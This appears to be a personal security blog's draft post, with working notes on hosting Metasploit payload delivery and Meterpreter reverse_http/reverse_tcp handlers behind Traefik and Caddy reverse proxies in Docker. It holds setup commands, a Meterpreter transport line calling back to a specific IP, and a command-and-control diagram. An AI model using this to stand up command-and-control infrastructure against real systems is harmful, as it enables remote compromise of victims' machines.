@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Serving payloads in the cloud with Metasploit and Docker :: khast3x blog — Thoughts and notes on my side projects</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Traefik Done - Reverse http&#43;tcp  Use the docker-compose.yml method to deploy Defining each service attached to each definition solved the multi service error Want to try with tcp This Doc page with more details on making rules/chaning them here Securing the docker host exposing the the api here Test staged payload  How to run  docker-compose up [new connection] docker exec -it msfconsole /bin/bash ./msfconsole -r web_delivery.rc &amp;gt; run OR  for TCP set payload 10 &#43; set LPORT 8888 &#43; run    transport add -t reverse_http -u handler -l 163."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://khast3x.club/posts/DRAFT-2020-Serving-Meterpreter-Cloud/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://khast3x.club/assets/style.css">
+
+
+<link rel="stylesheet" href="https://khast3x.club/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://khast3x.club/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://khast3x.club/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Serving payloads in the cloud with Metasploit and Docker"/>
+<meta name="twitter:description" content="Proxies and payloads"/>
+
+
+
+<meta property="og:title" content="Serving payloads in the cloud with Metasploit and Docker" />
+<meta property="og:description" content="Proxies and payloads" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://khast3x.club/posts/DRAFT-2020-Serving-Meterpreter-Cloud/" />
+<meta property="article:published_time" content="2019-10-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-10-19T00:00:00+00:00" /><meta property="og:site_name" content="khast3x blog" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">khast3x blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="https://khast3x.club/posts/DRAFT-2020-Serving-Meterpreter-Cloud/">Serving payloads in the cloud with Metasploit and Docker</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            2019-10-19
+        </span>
+      
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://khast3x.club/tags/docker/">docker</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/metasploit/">metasploit</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/cloudC2/">cloudC2</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/satellite/">satellite</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      <h1 id="traefik">Traefik</h1>
+<h2 id="done---reverse-httptcp">Done - Reverse http+tcp</h2>
+<ul>
+<li>Use the docker-compose.yml method to deploy</li>
+<li>Defining each service attached to each definition solved the multi service error</li>
+<li>Want to try with tcp</li>
+<li><a href="https://medium.com/@containeroo/traefik-2-0-docker-a-simple-step-by-step-guide-e0be0c17cfa5">This</a></li>
+<li>Doc page with more details on making rules/chaning them <a href="https://docs.traefik.io/v2.0/routing/routers/#rule">here</a></li>
+<li>Securing the docker host exposing the the api <a href="https://medium.com/@containeroo/traefik-2-0-paranoid-about-mounting-var-run-docker-sock-22da9cb3e78c">here</a></li>
+<li>Test staged payload</li>
+</ul>
+<h3 id="how-to-run">How to run</h3>
+<ul>
+<li><code>docker-compose up</code></li>
+<li>[new connection] <code>docker exec -it msfconsole /bin/bash</code></li>
+<li><code>./msfconsole -r web_delivery.rc</code></li>
+<li><code>&gt; run</code> OR
+<ul>
+<li>for TCP <code>set payload 10</code> + <code>set LPORT 8888</code> + <code>run</code></li>
+</ul>
+</li>
+</ul>
+<p><code>transport add -t reverse_http -u handler -l 163.172.185.244 -p 80</code>
+<code>transport next</code>
+=&gt; Seems handler can reload orphaned sessions</p>
+<h3 id="ideas">Ideas</h3>
+<ul>
+<li>Plug Satellite to serve payloads</li>
+<li>use official msf + postgres service like NullArray Autosploit</li>
+<li>plug empire to postgres db</li>
+</ul>
+<h2 id="initial-tests">Initial tests</h2>
+<p>Simple launch:</p>
+<pre><code>docker run -d -p 8080:8080 -p 80:80 --network my-net -v $PWD/traefik.toml:/etc/traefik/traefik.toml traefik
+</code></pre><p>Building the MSF cli with labels:</p>
+<pre><code>docker run -it --network my-net -l traefik.delivery.rule=PathPrefixStrip:/toto -l traefik.delivery.port 8080 --name msf phocean/msf
+</code></pre><h2 id="understanding-traefik">Understanding Traefik</h2>
+<p>When using Docker as a provider, &ldquo;Services&rdquo; are the docker-compose service definitions.</p>
+<p>Regarding ports: If a container exposes multiple ports, or does not expose any port, then you must manually specify which port Traefik should use for communication by using the label traefik.http.services.&lt;service_name&gt;.loadbalancer.server.port (Read more on this label in the dedicated section in routing) <a href="https://docs.traefik.io/providers/docker/#port-detection">source</a></p>
+<pre><code>        Target            Reverse Proxy              C2
+                        +--------------+     +------------------+
+      +----------+      | +----------+ |     | +--------------+ |
+START |  TARGET  +--:80---&gt; /deliver +--:8080--&gt; web_delivery | |
++-----+   EXEC   |      | |  (URI)   | |     | |   (script)   | |
+|     +----------+      | +----------+ |     | +--------------+ |
+|                       |              |     |                  |
+|  +-------------+      | +----------+ |     | +--------------+ |
+|  | METERPRETER |      | | /handler | |     | | http handler | |
++--&gt; reverse_http+--:80---&gt;  (URI)   +--:4444--&gt;   (auto)     | |
+|  |  (payload)  |      | +----------+ |     | +--------------+ |
+|  +-------------+      |              |     |                  |
+|                       |              |     |                  |
+|  +-------------+      | +----------+ |     | +--------------+ |
++--&gt; METERPRETER |      | |   TCP    | |     | | tcp handler  | |
+   | reverse_tcp +-:8888--&gt;  ROUTER  +--:4445--&gt;   (auto)     | |
+   |  (payload)  |      | +----------+ |     | +--------------+ |
+   +-------------+      |              |     |                  |
+                        |  =TRAEFIK=   |     |  =METASPLOIT=    |
+                        |  =CONTAINER= |     |  =CONTAINER=     |
+                        +--------------+     +------------------+
+
++-----------------------+---------------------------------------+
+|       Internet        |      Cozy Segregated Network          |
++-----------------------+---------------------------------------+
+
+
+
+</code></pre><hr>
+<h1 id="caddy">Caddy</h1>
+<h2 id="metasploit">Metasploit</h2>
+<pre><code>web_delivery
+set LPORT 80
+
+</code></pre><h2 id="notes">Notes</h2>
+<h4 id="426-am">4:26 AM</h4>
+<p>Caddy is not forwarding to msf container either because CURL doesnt have the correct header, or because I&rsquo;m not understanding directives correctly.</p>
+<h4 id="332-am">3:32 AM</h4>
+<p><a href="https://github.com/lucaslorentz/caddy-docker-proxy#automatic-proxy-generation">Using</a></p>
+<pre><code>$ docker run -it --network my-net --name msf --label caddy.address=msf/toto --label caddy.targetport=8080 -l caddy.tls=off -l caddy.targetpath=/toto phocean/msf
+
+$ docker run --name caddy -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock lucaslorentz/caddy-docker-proxy:ci-alpine -agree -email email@example.com -log stdout -docker-process-caddyfile 
+</code></pre><hr>
+<p>We are inly trying one route first. When going for the handler route, directives can be added to specific routes by adding a sub directive(caddy.SUB.port=).
+I don&rsquo;t think these include the auto labels, will have to use Caddy directives from proxy doc <a href="https://github.com/lucaslorentz/caddy-docker-proxy#multiple-caddyfile-sections-from-one-servicecontainer">THIS</a></p>
+
+    </div>
+    
+    
+
+    
+      
+    
+    
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">khast3x blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://khast3x.club/assets/main.js"></script>
+<script src="https://khast3x.club/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-113498686-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
